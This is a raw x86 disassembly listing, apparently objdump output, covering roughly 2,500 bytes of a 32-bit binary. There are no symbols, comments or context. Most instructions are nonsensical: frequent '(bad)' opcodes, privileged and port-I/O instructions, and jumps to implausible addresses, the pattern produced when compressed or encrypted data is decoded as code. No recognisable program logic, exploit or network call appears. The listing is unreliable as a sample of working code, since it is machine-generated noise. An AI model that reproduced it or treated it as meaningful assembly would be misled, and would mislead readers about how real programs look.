  41e822:	mov    es,WORD PTR [ebp-0xb]
  41e825:	iret   
  41e826:	lea    ebp,[ebx+0x37e]
	...
  41e848:	fiadd  WORD PTR [ecx]
  41e84a:	div    BYTE PTR [esi-0x3]
  41e84d:	jbe    0x41e803
  41e84f:	dec    edi
  41e850:	add    BYTE PTR [ecx-0x19],dh
  41e853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e854:	add    eax,0xfb82ac3
  41e859:	sub    DWORD PTR [ebx+ebx*1-0x4f95f7dc],ebp
  41e860:	add    BYTE PTR cs:[esp+edi*8-0x37daaf6b],bh
  41e868:	stc    
  41e869:	jmp    FWORD PTR [edi-0x28]
  41e86c:	cmp    ah,BYTE PTR [edx-0x4ccd371f]
  41e872:	std    
  41e873:	cs dec esi
  41e875:	and    al,0x62
  41e877:	enter  0x28ce,0xb4
  41e87b:	push   edi
  41e87c:	mov    WORD PTR [edi],?
  41e87e:	jmp    0x965f05
  41e883:	jmp    0x6f05a5f1
  41e888:	jb     0x41e8a1
  41e88a:	add    al,0xaf
  41e88c:	sar    BYTE PTR [eax],cl
  41e88e:	add    BYTE PTR [edx-0x36],dh
  41e891:	and    BYTE PTR [ecx],bh
  41e893:	sub    al,0xf5
  41e895:	mov    cl,0x9
  41e897:	fidivr WORD PTR [ecx]
  41e899:	mov    ebp,0xcd41f6db
  41e89e:	(bad)  
  41e8a0:	mov    cl,0xfb
  41e8a2:	mov    ah,0x2c
  41e8a4:	icebp  
  41e8a5:	cli    
  41e8a6:	mov    ah,0x14
  41e8a8:	cmp    eax,0xa77b80
	...
  41e8c9:	add    BYTE PTR [ecx],dl
  41e8cb:	adc    DWORD PTR [ebx-0x43],0xd2660255
  41e8d2:	push   ebx
  41e8d3:	push   0xfa8ef374
  41e8d8:	add    DWORD PTR [ecx+0x5],esi
  41e8db:	cli    
  41e8dc:	or     al,0x36
  41e8de:	fldcw  WORD PTR [eax-0x18]
  41e8e1:	loope  0x41e8c9
  41e8e3:	ret    
  41e8e4:	or     eax,0xfdbcc8e8
  41e8e9:	call   0x6b01b5c5
  41e8ee:	retf   
  41e8ef:	std    
  41e8f0:	jg     0x41e8c6
  41e8f2:	and    DWORD PTR [eax],eax
  41e8f4:	or     eax,0xffff9764
  41e8f9:	call   0x6949e38c
  41e8fe:	bound  edi,QWORD PTR [eax]
  41e900:	add    BYTE PTR [ebx+0x10],ah
  41e903:	mov    ah,0x2e
  41e905:	imul   esi,DWORD PTR [edx+0x2b],0xa2149d00
  41e90c:	mov    BYTE PTR [edx+eax*8+0x76bc38a1],dh
  41e913:	lods   al,BYTE PTR ds:[esi]
  41e914:	fidivr WORD PTR es:[ecx-0x2d]
  41e918:	fild   DWORD PTR [eax]
  41e91a:	add    BYTE PTR [eax],al
  41e91c:	mov    BYTE PTR [edi],al
  41e91e:	jg     0x41e95f
  41e920:	(bad)  [eax-0x1741da08]
  41e926:	in     al,dx
  41e927:	stos   DWORD PTR es:[edi],eax
  41e928:	inc    ebx
  41e929:	push   cs
  41e92a:	in     eax,0xbd
  41e92c:	inc    eax
  41e92d:	inc    DWORD PTR [eax]
	...
  41e94b:	add    ch,ah
  41e94d:	stos   BYTE PTR es:[edi],al
  41e94e:	push   eax
  41e94f:	mov    eax,0xeb01bd37
  41e954:	lods   al,BYTE PTR ds:[esi]
  41e955:	daa    
  41e956:	or     eax,0xffd4e9c6
  41e95b:	xchg   DWORD PTR [ebx+0x31d070d4],ebp
  41e961:	dec    DWORD PTR ds:0xfabbd9ff
  41e967:	jne    0x41e935
  41e969:	aam    0x70
  41e96b:	clc    
  41e96c:	aam    0xd4
  41e96e:	jo     0x41e964
  41e970:	mov    WORD PTR [ecx+edi*8-0x1],ds
  41e974:	xchg   ebx,eax
  41e975:	add    al,dh
  41e977:	test   DWORD PTR [esi+ebp*2-0x448600cb],esp
  41e97e:	or     dh,BYTE PTR [edi+0x75fae031]
  41e984:	fsub   QWORD PTR [ebx]
  41e986:	mov    ah,0x55
  41e988:	mov    ah,0xd3
  41e98a:	jo     0x41e980
  41e98c:	fild   QWORD PTR [ebp-0x4f]
  41e98f:	(bad)  
  41e990:	cmp    eax,DWORD PTR [edx]
  41e992:	xchg   DWORD PTR [ebp+0x2c],edi
  41e995:	stos   DWORD PTR es:[edi],eax
  41e996:	inc    eax
  41e997:	(bad)  
  41e998:	mov    esp,0xdae8fc3d
  41e99d:	jmp    0x41e999
  41e99f:	jmp    FWORD PTR [edi-0xfcf6c3]
  41e9a5:	dec    edi
  41e9a6:	cld    
  41e9a7:	jne    0x41e9a1
  41e9a9:	inc    ebp
  41e9ab:	push   eax
  41e9ac:	cld    
  41e9ad:	xor    BYTE PTR [edx],cl
  41e9af:	add    DWORD PTR [eax],eax
	...
  41e9cd:	add    BYTE PTR ds:0x8ef10019,cl
  41e9d3:	pop    ebx
  41e9d4:	xor    DWORD PTR [eax],edx
  41e9d6:	xchg   BYTE PTR [ebx+0x31],dl
  41e9d9:	and    DWORD PTR [eax-0x2b],0xed503910
  41e9e0:	sti    
  41e9e1:	mov    edx,DWORD PTR [ebx+0x17]
  41e9e4:	sub    ebp,edi
  41e9e6:	mov    ss,ebx
  41e9e8:	pop    ss
  41e9e9:	adc    BYTE PTR [esi+0x388117db],al
  41e9ef:	popa   
  41e9f0:	adc    al,0x39
  41e9f2:	dec    eax
  41e9f3:	mov    ecx,edi
  41e9f5:	mov    ebp,edi
  41e9f7:	ds sub ebp,edi
  41e9fa:	push   esi
  41e9fb:	push   es
  41e9fc:	jge    0x41e9c4
  41e9fe:	dec    ebx
  41e9ff:	pusha  
  41ea00:	inc    esi
  41ea01:	adc    BYTE PTR ds:0x8eec7d0c,cl
  41ea07:	mov    eax,ds
  41ea09:	push   eax
  41ea0a:	cmp    ebp,esi
  41ea0c:	hlt    
  41ea0d:	sar    DWORD PTR [esi],1
  41ea0f:	mov    es,ecx
  41ea11:	xor    BYTE PTR [ebp-0x61],cl
  41ea14:	into   
  41ea15:	out    dx,eax
  41ea16:	test   BYTE PTR [ebx],al
  41ea18:	xor    BYTE PTR [edi+0x7b7b84d8],al
  41ea1e:	jns    0x41ea8f
  41ea20:	rcl    BYTE PTR [ebx],1
  41ea22:	adc    al,bh
  41ea24:	pop    ebp
  41ea25:	call   FWORD PTR [edx+0x18]
  41ea28:	jle    0x41ea75
  41ea2a:	add    eax,0x94e3ceb0
  41ea2f:	pop    ebx
  41ea30:	and    DWORD PTR [ecx+0x0],ecx
	...
  41ea4e:	add    BYTE PTR [eax],al
  41ea50:	shr    BYTE PTR [eax],1
  41ea52:	jl     0x41eaa7
  41ea54:	cmp    DWORD PTR [ecx],eax
  41ea56:	ds or  eax,0x29883
  41ea5c:	or     eax,0x96fbb6a2
  41ea61:	jae    0x41ea84
  41ea63:	mov    edi,0x7ce8ff2c
  41ea68:	mov    BYTE PTR [edi+0x72],0xf8
  41ea6c:	adc    eax,0x100ba3e9
  41ea71:	jl     0x41ea29
  41ea73:	add    al,0xd
  41ea75:	add    BYTE PTR [eax-0x47],dh
  41ea78:	cli    
  41ea79:	jae    0x41ea12
  41ea7b:	sub    dl,al
  41ea7d:	mov    ebx,0xd04fe
  41ea82:	out    0x7e,eax
  41ea84:	fucomp st(1)
  41ea86:	sub    edx,DWORD PTR [eax]
  41ea88:	push   esi
  41ea89:	(bad)  
  41ea8a:	jno    0x41ea44
  41ea8c:	loop   0x41eb07
  41ea8e:	push   esp
  41ea8f:	sub    al,0xfa
  41ea91:	jecxz  0x41ea74
  41ea93:	mov    al,0x45
  41ea95:	jns    0x41eadb
  41ea97:	sub    BYTE PTR [ebp+esi*1-0x5ce546fe],al
  41ea9e:	in     al,0x7e
  41eaa0:	push   esi
  41eaa1:	sub    al,dh
  41eaa3:	not    DWORD PTR [ebp-0x55]
  41eaa6:	in     al,dx
  41eaa7:	ret    0xa2d5
  41eaaa:	mul    BYTE PTR [edi+0x33d1b57c]
  41eab0:	(bad)  
  41eab1:	std    
  41eab2:	pop    edi
  41eab3:	test   al,0x0
	...
  41ead1:	add    BYTE PTR [edx+0x77],ch
  41ead4:	add    al,0x30
  41ead6:	xor    al,0xa3
  41ead8:	jb     0x41ea82
  41eada:	or     eax,0x8c2ff477
  41eadf:	mov    ds:0xf7db037e,eax
  41eae4:	and    DWORD PTR [ecx-0x3a165b9e],ebp
  41eaea:	xor    eax,0x2aa069fc
  41eaef:	add    BYTE PTR [edx-0x58],ah
  41eaf2:	or     bh,BYTE PTR [edi]
  41eaf4:	dec    esi
  41eaf5:	add    eax,0xee1e00cb
  41eafa:	lahf   
  41eafb:	or     eax,DWORD PTR [eax]
  41eafd:	mov    ch,0xc0
  41eaff:	jbe    0x41eb7c
  41eb01:	cmp    eax,0xd2efb89b
  41eb06:	push   ebp
  41eb07:	sub    DWORD PTR [ecx],ebp
  41eb09:	cmp    ecx,edx
  41eb0b:	mov    esi,0x771abc86
  41eb10:	push   ebx
  41eb11:	adc    eax,0x72fbd1db
  41eb16:	lds    ebx,FWORD PTR [eax]
  41eb18:	sub    ecx,edi
  41eb1a:	in     al,0x53
  41eb1c:	xlat   BYTE PTR ds:[ebx]
  41eb1d:	stos   DWORD PTR es:[edi],eax
  41eb1e:	popa   
  41eb1f:	mov    cl,0xd7
  41eb21:	fidiv  WORD PTR [edi]
  41eb23:	xor    bh,BYTE PTR [ecx]
  41eb25:	(bad)  
  41eb26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb27:	cld    
  41eb28:	mov    BYTE PTR [eiz*1+0x20c14b7d],bh
  41eb2f:	dec    BYTE PTR [eax+0x537d492c]
  41eb35:	rol    DWORD PTR [eax],1
	...
  41eb53:	add    BYTE PTR [ecx+0x23e91ba8],cl
  41eb59:	mov    bl,0x1
  41eb5b:	cmp    al,0x8
  41eb5d:	jns    0x41ebac
  41eb5f:	out    0x19,eax
  41eb61:	ror    DWORD PTR [edi],1
  41eb63:	div    BYTE PTR ds:0x33a813d1
  41eb69:	add    bh,BYTE PTR [ecx]
  41eb6b:	mov    ds:0xe9cb7384,eax
  41eb70:	push   cs
  41eb71:	add    ch,bh
  41eb73:	sub    al,0xc5
  41eb75:	jg     0x41ebf2
  41eb77:	fisttp QWORD PTR [esi]
  41eb79:	ja     0x41ebee
  41eb7b:	in     eax,0xb3
  41eb7d:	pop    es
  41eb7e:	mov    DWORD PTR [ecx+ebp*1],ebx
  41eb81:	js     0x41eb8f
  41eb83:	push   ds
  41eb84:	sar    DWORD PTR [eax-0x145a8e07],cl
  41eb8a:	(bad)  
  41eb8b:	pusha  
  41eb8c:	test   ebx,ebp
  41eb8e:	add    DWORD PTR [ebx-0x7e],esp
  41eb91:	daa    
  41eb92:	mov    BYTE PTR [eax],al
  41eb94:	js     0x41ebc5
  41eb96:	add    BYTE PTR [ebx+0x4d89fff3],al
  41eb9c:	fdivr  DWORD PTR [ebx-0x17d1fb24]
  41eba2:	xchg   DWORD PTR [ebx+esi*1],ecx
  41eba5:	mov    ds:0xe72ae848,al
  41ebaa:	mov    edi,0x4eaaf0e1
  41ebaf:	(bad)  
  41ebb0:	out    dx,al
  41ebb1:	in     eax,0xfe
  41ebb3:	xlat   BYTE PTR ds:[ebx]
  41ebb4:	jl     0x41ec1e
  41ebb6:	xor    al,0x1
	...
  41ebd4:	add    BYTE PTR [eax],al
  41ebd6:	ja     0x41eb99
  41ebd8:	add    DWORD PTR [ecx+0x45850b59],ecx
  41ebde:	fsub   QWORD PTR [esi-0x42d02ba8]
  41ebe4:	js     0x41ec29
  41ebe6:	aas    
  41ebe7:	xor    ah,ch
  41ebe9:	mov    ebp,ecx
  41ebeb:	xlat   BYTE PTR ds:[ebx]
  41ebec:	(bad)  
  41ebed:	shr    BYTE PTR ds:0x118bd532,1
  41ebf3:	loopne 0x41eb79
  41ebf5:	push   ebp
  41ebf6:	mov    esp,0xe98b1a04
  41ebfb:	xlat   BYTE PTR ds:[ebx]
  41ebfc:	out    0x15,al
  41ebfe:	daa    
  41ebff:	pop    edx
  41ec00:	cmc    
  41ec01:	push   eax
  41ec03:	ja     0x70e6885e
  41ec09:	sbb    bh,ch
  41ec0b:	cmp    DWORD PTR ds:0x33a6b503,eax
  41ec11:	xchg   ebx,eax
  41ec12:	and    eax,0x68d84a15
  41ec17:	loope  0x41eb9f
  41ec19:	dec    ebp
  41ec1a:	inc    esp
  41ec1b:	fadd   DWORD PTR [eax-0x8]
  41ec1e:	gs push 0xffffffe5
  41ec21:	mov    ebx,DWORD PTR [ecx+0x4d36d7]
  41ec27:	pop    ebx
  41ec28:	int    0xff
  41ec2a:	or     eax,0xc8892554
  41ec2f:	sub    dl,ch
  41ec31:	dec    edx
  41ec32:	xor    DWORD PTR [edx],ebp
  41ec34:	jne    0x41ebb8
  41ec36:	sub    esp,edx
  41ec38:	daa    
  41ec39:	xor    DWORD PTR [eax],eax
	...
  41ec57:	add    BYTE PTR [edi],bh
  41ec59:	sbb    BYTE PTR [esi+0x2b84ce3],dh
  41ec5f:	inc    ecx
  41ec61:	clc    
  41ec62:	sar    BYTE PTR [eax],0x50
  41ec65:	sub    eax,0xb628bf8
  41ec6a:	sub    ch,bh
  41ec6c:	xchg   BYTE PTR [ebx-0xb],bl
  41ec6f:	mov    DWORD PTR [eax-0x23],eax
  41ec72:	js     0x41ec7c
  41ec74:	xchg   esi,eax
  41ec75:	fld    st(7)
  41ec77:	pop    ebp
  41ec78:	inc    esi
  41ec79:	loopne 0x41ecbd
  41ec7b:	sbb    BYTE PTR ds:0xd8e94166,cl
  41ec81:	jecxz  0x41ecfb
  41ec83:	in     al,dx
  41ec84:	mov    ?,WORD PTR [esp+edx*8]
  41ec87:	mov    BYTE PTR [eax+0x21],dl
  41ec8a:	jp     0x41ecd3
  41ec8c:	sbb    ebx,ebp
  41ec8e:	int3   
  41ec8f:	xchg   BYTE PTR [eax+0x69],al
  41ec92:	jns    0x41ecdf
  41ec94:	std    
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	sub    DWORD PTR [ecx-0x37fde2c8],ecx
  41ec9c:	push   cs
  41ec9d:	outs   dx,DWORD PTR ds:[esi]
  41ec9e:	icebp  
  41ec9f:	cmc    
  41eca0:	retf   
  41eca1:	shl    DWORD PTR ds:0x24db5300,cl
  41eca7:	add    BYTE PTR [ebx+ebx*8+0x58f88773],dl
  41ecae:	jnp    0x41ecf3
  41ecb0:	gs cmp eax,0x79980d44
  41ecb6:	add    eax,DWORD PTR [eax]
  41ecb8:	or     eax,0x87393e
	...
  41ecd9:	add    al,cl
  41ecdb:	pusha  
  41ecdc:	sbb    DWORD PTR [ecx],eax
  41ecde:	xchg   bh,bh
  41ece0:	mov    ebx,0x26bc95f7
  41ece5:	jge    0x41ecc5
  41ece7:	adc    edx,DWORD PTR [edx]
  41ece9:	push   esp
  41ecea:	or     BYTE PTR [ebp-0x6e],dh
  41eced:	add    eax,0x4212000d
  41ecf2:	xchg   edx,eax
  41ecf3:	mov    esp,0x770c1b2a
  41ecf8:	lods   al,BYTE PTR ds:[esi]
  41ecf9:	aaa    
  41ecfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecfb:	seto   BYTE PTR [esi+eax*8+0x2b]
  41ed00:	jo     0x41ecbb
  41ed02:	add    ah,dh
  41ed04:	daa    
  41ed05:	test   eax,0x2fac770d
  41ed0a:	test   BYTE PTR [ebx-0x5c4c14e2],bh
  41ed10:	jmp    0xfe6a3b91
  41ed15:	mov    al,0xda
  41ed17:	icebp  
  41ed18:	cmp    eax,0x7421f2b9
  41ed1d:	das    
  41ed1e:	add    BYTE PTR [ecx+0x3c],ch
  41ed21:	sbb    al,cl
  41ed23:	stos   DWORD PTR es:[edi],eax
  41ed24:	(bad)  
  41ed25:	jp     0x41ed6d
  41ed27:	clc    
  41ed28:	mov    esi,0xce21c124
  41ed2d:	jp     0x41ed7d
  41ed2f:	sub    dh,dh
  41ed31:	push   esi
  41ed32:	dec    esi
  41ed33:	sub    al,0x6a
  41ed35:	mov    al,ds:0xa06a00ba
  41ed3a:	mov    dh,0x0
  41ed3c:	push   0xffffffa0
	...
  41ed5a:	add    BYTE PTR [eax],al
  41ed5c:	mov    dl,0x0
  41ed5e:	push   0xffffffa0
  41ed60:	outs   dx,BYTE PTR ds:[esi]
  41ed61:	add    BYTE PTR [edx-0x30],dh
  41ed64:	jb     0x41edd9
  41ed66:	rol    DWORD PTR ds:0x3e639d3,cl
  41ed6c:	mov    ch,BYTE PTR [ebx+0x6bce7c3e]
  41ed72:	jo     0x41ed34
  41ed74:	cmp    al,BYTE PTR ds:[eax]
  41ed77:	sub    al,0xc1
  41ed79:	and    bl,al
  41ed7b:	and    al,0xfe
  41ed7d:	and    BYTE PTR [ecx+ebp*1-0x237f4c90],al
  41ed84:	out    dx,al
  41ed85:	push   DWORD PTR [edx-0x14]
  41ed88:	mov    bh,0xfd
  41ed8a:	xchg   BYTE PTR [esi+eax*8+0x4c020276],ah
  41ed91:	dec    ecx
  41ed92:	jae    0x41ed78
  41ed94:	jmp    0x41ed52
  41ed96:	fild   WORD PTR [edx-0x3]
  41ed99:	jle    0x41ee16
  41ed9b:	inc    ebp
  41ed9c:	push   cs
  41ed9d:	lods   eax,DWORD PTR ds:[esi]
  41ed9e:	add    al,0x2f
  41eda0:	int    0xf
  41eda2:	add    BYTE PTR [eax-0x33],dh
  41eda5:	inc    esp
  41eda6:	cmp    DWORD PTR [edx+edx*2-0x32f1f153],ebp
  41edad:	sbb    al,0xfd
  41edaf:	mov    ah,0x5a
  41edb1:	jg     0x41ed75
  41edb3:	in     eax,0x8f
  41edb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edb6:	shr    ecx,cl
  41edb8:	mov    bl,0x38
  41edba:	jmp    0xcffefea4
  41edbf:	jmp    0x41edc4
	...
  41eddc:	add    BYTE PTR [eax],al
  41edde:	inc    ebp
  41eddf:	mov    ebp,0x408220e3
  41ede4:	jbe    0x41edc7
  41ede6:	xor    eax,0x7a62d7bd
  41edeb:	inc    esp
  41edec:	jmp    0xdbff13e0
  41edf1:	jb     0x41ee4d
  41edf3:	dec    eax
  41edf4:	xor    BYTE PTR [ebx+esi*8],0xff
  41edf8:	jae    0x41edde
  41edfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edfb:	mov    ebp,0xa0661dc3
  41ee00:	or     al,0xeb
  41ee02:	push   es
  41ee03:	cld    
  41ee04:	sbb    eax,0xea60e162
  41ee09:	loope  0x41ee01
  41ee0b:	retf   
  41ee0c:	sbb    eax,0xcfa77500
  41ee11:	sar    DWORD PTR [esi+0xb],0x85
  41ee15:	inc    ebp
  41ee16:	test   al,0xbc
  41ee18:	out    0x18,eax
  41ee1a:	in     al,dx
  41ee1b:	dec    edi
  41ee1c:	sbb    eax,DWORD PTR [edx]
  41ee1e:	mov    esp,0xea031b3f
  41ee23:	pusha  
  41ee24:	sti    
  41ee25:	add    DWORD PTR [edi+0x418003e1],esp
  41ee2b:	str    WORD PTR [edi]
  41ee2e:	mov    ecx,0x34ffff9d
  41ee33:	jl     0x41ee40
  41ee35:	or     BYTE PTR [eax+ebx*2+0x22ae00cd],ah
  41ee3c:	jno    0x41ee75
  41ee3e:	je     0x41eea7
  41ee40:	cld    
	...
  41ee5d:	add    BYTE PTR [eax],al
  41ee5f:	add    BYTE PTR [eax+0x604d381e],bl
  41ee65:	push   eax
  41ee66:	xor    DWORD PTR [eax+ebp*8],ecx
  41ee69:	fwait
  41ee6a:	add    cl,BYTE PTR [eax-0x3e78fa20]
  41ee70:	xor    eax,0xa88807fc
  41ee75:	add    eax,0xc3258afd
  41ee7a:	out    0x10,eax
  41ee7c:	cmp    eax,0xddc1b956
  41ee81:	or     ecx,DWORD PTR [eax-0x77fe3dbc]
  41ee87:	dec    esp
  41ee88:	mov    ds:0xd345c600,al
  41ee8d:	add    bh,BYTE PTR [edi-0x3a]
  41ee90:	test   al,0xf8
  41ee92:	pop    es
  41ee93:	or     al,0xb4
  41ee95:	fld    QWORD PTR [eax-0x1]
  41ee98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee99:	fwait
  41ee9a:	add    bh,bh
  41ee9c:	sub    DWORD PTR [eax+ecx*4+0x70e48204],esi
  41eea3:	les    ecx,FWORD PTR ds:0x72f7ae76
  41eea9:	hlt    
  41eeaa:	das    
  41eeab:	push   eax
  41eeac:	push   0x1c
  41eeae:	xor    eax,ebp
  41eeb0:	call   0xf3f1251
  41eeb5:	cdq    
  41eeb6:	jge    0x41ee78
  41eeb8:	fcom   DWORD PTR [edx+0x24]
  41eebb:	jae    0x41ef02
  41eebd:	push   ss
  41eebe:	ins    BYTE PTR es:[edi],dx
  41eebf:	dec    ebx
  41eec0:	xor    eax,0xf3adbe
	...
  41eee1:	add    BYTE PTR [edx],cl
  41eee3:	jle    0x41eeb3
  41eee5:	jmp    0x41ef19
  41eee7:	xor    al,0x31
  41eee9:	mov    DWORD PTR [eax+0xc053b80],esp
  41eeef:	xchg   edx,eax
  41eef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eef1:	pop    es
  41eef2:	test   DWORD PTR [ebx+eiz*1-0x78],ebp
  41eef6:	enter  0x18ed,0x8c
  41eefa:	(bad)  
  41eefb:	in     eax,0x23
  41eefd:	mov    DWORD PTR [eax-0x4b],ecx
  41ef00:	inc    ecx
  41ef01:	loopne 0x41ef12
  41ef03:	pop    ecx
  41ef04:	and    al,0x73
  41ef06:	std    
  41ef07:	mov    ebx,0xf13c1df4
  41ef0c:	fiadd  DWORD PTR [esi]
  41ef0e:	or     al,0x29
  41ef10:	add    al,dh
  41ef12:	mov    gs,WORD PTR [ebx+0x15]
  41ef15:	adc    BYTE PTR [esi+0x38811563],al
  41ef1b:	push   ebp
  41ef1c:	hlt    
  41ef1d:	cmp    BYTE PTR [eax+0x69],cl
  41ef20:	adc    DWORD PTR [ecx+ecx*2-0x7102dec9],ecx
  41ef27:	jecxz  0x41ef54
  41ef29:	adc    BYTE PTR [esi+0x30812beb],dl
  41ef2f:	push   ecx
  41ef30:	hlt    
  41ef31:	cmp    BYTE PTR [eax-0x67],dl
  41ef34:	adc    BYTE PTR [ebp+ebp*8-0x1502de92],cl
  41ef3b:	push   DWORD PTR [ecx+0x4a]
  41ef3e:	jecxz  0x41ef88
  41ef40:	test   eax,0x61b50d10
  41ef45:	xor    BYTE PTR [eax],al
	...
  41ef63:	add    BYTE PTR [esp+eax*8-0x10302126],al
  41ef6a:	cmc    
  41ef6b:	mov    bh,BYTE PTR [ebp-0x1]
  41ef6e:	out    0x3,al
  41ef70:	mov    esp,0xfe9b61b5
  41ef75:	add    dh,ah
  41ef77:	paddb  mm7,QWORD PTR [edx]
  41ef7a:	and    cl,al
  41ef7c:	push   ds
  41ef7d:	xchg   esi,eax
  41ef7e:	push   es
  41ef7f:	(bad)  
  41ef80:	fiadd  WORD PTR [edi]
  41ef82:	fs or  ah,bh
  41ef85:	scas   eax,DWORD PTR es:[edi]
  41ef86:	popa   
  41ef87:	dec    ebx
  41ef88:	xor    eax,0x20233921
  41ef8d:	push   cs
  41ef8e:	jne    0x41ef5b
  41ef90:	fild   DWORD PTR [eax]
  41ef92:	lods   al,BYTE PTR ds:[esi]
  41ef93:	or     eax,DWORD PTR [eax]
  41ef95:	push   esi
  41ef96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef97:	ror    DWORD PTR ds:0x1ec0e238,cl
  41ef9d:	xchg   edx,eax
  41ef9e:	push   es
  41ef9f:	(bad)  
  41efa0:	push   eax
  41efa1:	clc    
  41efa2:	popa   
  41efa3:	mov    ecx,0xc4ae8a1e
  41efa8:	or     eax,0xbb06f2c3
  41efad:	mov    DWORD PTR ds:0x7bffd484,ebp
  41efb3:	repz adc eax,0x94d77a12
  41efb9:	imul   DWORD PTR [esi-0x5]
  41efbc:	add    bh,BYTE PTR [edi+0x163f4e21]
  41efc2:	ret    0x32eb
  41efc5:	sbb    ecx,ebp
  41efc7:	cwde   
	...
  41efe4:	add    BYTE PTR [eax],al
  41efe6:	sbb    bl,cl
  41efe8:	mov    eax,0xe08a0196
  41efed:	mov    esi,ebp
  41efef:	mov    edi,0x47b227ff
  41eff4:	jb     0x41efad
  41eff6:	cmp    ebp,edi
  41eff8:	jg     0x41ef9c
  41effa:	or     dl,BYTE PTR [ecx-0x70df1df3]
  41f000:	or     DWORD PTR [ebx+0x71],esp
  41f003:	test   DWORD PTR [eax],ebx
  41f005:	sub    DWORD PTR [eax-0x28],edx
  41f008:	leave  
  41f009:	sti    
  41f00a:	add    al,0x87
  41f00c:	inc    ebx
  41f00d:	in     eax,dx
  41f00e:	adc    eax,ebx
  41f010:	or     esp,DWORD PTR [eax+0x45]
  41f013:	or     DWORD PTR [ecx],edi
  41f015:	and    al,0x41
  41f017:	or     al,0x86
  41f019:	fucomp st(7)
  41f01b:	sbb    bh,ch
  41f01d:	mov    edi,0x25187e7b
  41f022:	dec    ebx
  41f023:	sbb    eax,0x1d1e2b5c
  41f028:	push   esp
  41f029:	jb     0x41f01d
  41f02b:	xchg   BYTE PTR [ebx-0x13],cl
  41f02e:	call   DWORD PTR [edx+0x4f]
  41f031:	in     al,dx
  41f032:	mov    ebp,DWORD PTR [esp+eax*2]
  41f035:	call   0x1793:0xbed8cfc4
  41f03c:	data16 loop 0x41f082
  41f03f:	or     eax,DWORD PTR [edi+ecx*8-0x21fffff5]
  41f046:	inc    edi
  41f047:	lods   eax,DWORD PTR ds:[esi]
  41f048:	add    al,0x8f
	...
  41f066:	add    BYTE PTR [eax],al
  41f068:	ret    
  41f069:	prefetch BYTE PTR [ebp-0x27]
  41f06d:	(bad)  
  41f06e:	(bad)  
  41f06f:	call   0xe8814373
  41f074:	adc    esi,DWORD PTR [eax]
  41f076:	or     eax,0x5384fb9e
  41f07b:	mov    cl,0x67
  41f07d:	xchg   DWORD PTR [edi-0x16],ecx
  41f080:	fs call ebp
  41f083:	fiadd  WORD PTR [ebp+0x32]
  41f086:	xchg   DWORD PTR [eax],eax
  41f088:	add    eax,ecx
  41f08a:	test   BYTE PTR [ebp+0x78],bl
  41f08d:	mov    BYTE PTR [ecx-0x14],bl
  41f090:	sub    eax,0xa48bc95d
  41f095:	mov    al,BYTE PTR [ecx-0x38]
  41f098:	pop    edi
  41f099:	ret    0xb70a
  41f09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f09d:	ins    DWORD PTR es:[edi],dx
  41f09e:	pop    ebp
  41f09f:	pop    esi
  41f0a0:	in     eax,dx
  41f0a1:	push   esp
  41f0a2:	frstor [esi+0x3f]
  41f0a5:	lock outs dx,BYTE PTR ds:[esi]
  41f0a7:	add    eax,0xebed74dd
  41f0ac:	jb     0x41f09d
  41f0ae:	mov    dl,0xc0
  41f0b0:	in     eax,dx
  41f0b1:	inc    esp
  41f0b2:	in     eax,dx
  41f0b3:	data16 jg 0x41f10b
  41f0b6:	lds    ecx,FWORD PTR [edi]
  41f0b8:	mov    bh,0x5e
  41f0ba:	(bad)  
  41f0bb:	jmp    DWORD PTR [esi+eiz*2]
  41f0be:	cmp    BYTE PTR [ebp-0x2c],0x3
  41f0c2:	or     eax,DWORD PTR [eax+eax*2+0x1b000002]
  41f0c9:	mov    bh,0x50
  41f0cb:	lock add BYTE PTR [eax],al
	...
  41f0ea:	sub    esi,DWORD PTR [esi-0x70d4cfbe]
  41f0f0:	ror    DWORD PTR [ecx-0x48f5184f],0xb5
  41f0f7:	add    al,0x85
  41f0f9:	push   ebp
  41f0fa:	inc    eax
  41f0fb:	xchg   DWORD PTR [ecx-0x1c],eax
  41f0fe:	outs   dx,DWORD PTR ds:[esi]
  41f0ff:	inc    ebx
  41f100:	ror    DWORD PTR [ebx-0x39d91c7f],0xdb
  41f107:	mov    eax,0x5d846abf
  41f10c:	arpl   WORD PTR [ebx],di
  41f10e:	hlt    
  41f10f:	je     0x41f113
  41f111:	mov    DWORD PTR [ecx-0x44f9190d],esp
  41f117:	mov    eax,0xf7f189bf
  41f11c:	cmp    ecx,DWORD PTR gs:0x8e0d47bc
  41f123:	add    BYTE PTR [esi],al
  41f125:	add    BYTE PTR ds:0xa17b82cb,cl
  41f12b:	sub    DWORD PTR [eax],edx
  41f12d:	test   bl,dh
  41f12f:	add    DWORD PTR es:[eax],eax
  41f132:	sbb    dl,BYTE PTR [edx-0x45ed0c4b]
  41f138:	mov    DWORD PTR [edi],0xd4eb20a
  41f13e:	mov    edx,0xc98b23fc
  41f143:	pop    ss
  41f144:	and    BYTE PTR ds:0xad1061b2,cl
  41f14a:	dec    esp
  41f14b:	nop
  41f14c:	xchg   ebp,eax
  41f14d:	test   DWORD PTR [eax],0x0
	...
  41f16b:	add    BYTE PTR [edx],al
  41f16d:	fist   DWORD PTR [edi+0x1be40e2f]
  41f173:	add    eax,esp
  41f175:	mov    al,ds:0x9053ad0f
  41f17a:	int    0xcf
  41f17c:	add    al,BYTE PTR [edx+0x3cd8893f]
  41f182:	xor    DWORD PTR [edi],0xd7b5900d
  41f188:	test   BYTE PTR [ebp+ebx*2+0xd],ah
  41f18c:	mov    esp,edi
  41f18e:	add    BYTE PTR [eax],al
  41f190:	or     eax,0x8d2fcf9f
  41f195:	fild   WORD PTR [ecx]
  41f197:	jae    0x41f1d3
  41f199:	mov    ss,WORD PTR [eax]
  41f19b:	cmp    esi,ecx
  41f19d:	and    DWORD PTR [eax+0x1290cba],ecx
  41f1a3:	mov    DWORD PTR [edx+0x21],ecx
  41f1a6:	mov    WORD PTR [ebx-0x1b],cs
  41f1a9:	and    eax,0x9fc50147
  41f1ae:	int    0xbf
  41f1b0:	push   es
  41f1b1:	call   0xffd80949
